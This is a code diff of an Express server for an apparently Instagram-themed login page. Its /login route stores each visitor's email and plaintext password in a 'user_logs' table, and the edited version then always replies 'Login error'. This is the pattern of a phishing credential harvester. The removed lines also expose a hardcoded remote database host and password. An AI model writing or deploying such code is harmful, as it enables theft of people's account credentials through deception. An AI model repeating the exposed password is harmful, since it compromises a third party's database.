@@ -1,8 +1,9 @@
+// server.js
+
 const express = require('express');
 const bodyParser = require('body-parser');
-const mysql = require('mysql2/promise'); // Use mysql2/promise for async/await support
-const path = require('path');
-const cors = require('cors');
+const mysql = require('mysql2');
+const path = require('path'); // Import the path module
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -10,42 +11,35 @@ const port = process.env.PORT || 3000;
 // Middleware
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
-app.use(cors());
 
-// Create MySQL pool for connection pooling
-const pool = mysql.createPool({
-    host: 'viaduct.proxy.rlwy.net',
-user: 'root', // replace with your MySQL username
-password: 'RaRNOdpYCigBwEbaItdEiFMGOdcFvUay', // replace with your MySQL password
-database: 'instagram_db', // use your actual database name here
-    waitForConnections: true,
-    connectionLimit: 10,
-    queueLimit: 0
+// Create MySQL connection
+const db = mysql.createConnection({
+    host: 'localhost',
+    user: 'root', // replace with your MySQL username
+    password: '12345678', // replace with your MySQL password
+    database: 'insta_db' // use your actual database name here
+});
+
+db.connect((err) => {
+    if (err) throw err;
+    console.log('MySQL Connected...');
 });
 
 // Serve static files from the "public" directory
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Login Route
-app.post('/login', async (req, res) => {
+app.post('/login', (req, res) => {
     const { email, password } = req.body;
 
-    try {
-        // Get a connection from the pool
-        const connection = await pool.getConnection();
-        
-        // Execute the query using the connection
-        const [results] = await connection.query('INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())', [email, password]);
-        
-        // Release the connection back to the pool
-        connection.release();
-        
+    // Log user input values in the database (you can customize this part)
+    const logSql = 'INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())';
+    db.query(logSql, [email, password], (err, result) => {
+        if (err) throw err;
         console.log('User login data logged in database');
-        res.send('Login successful');
-    } catch (error) {
-        console.error('Error logging in user:', error);
-        res.status(500).send('Login error');
-    }
+    });
+
+    res.send('Login error');
 });
 
 app.listen(port, () => {
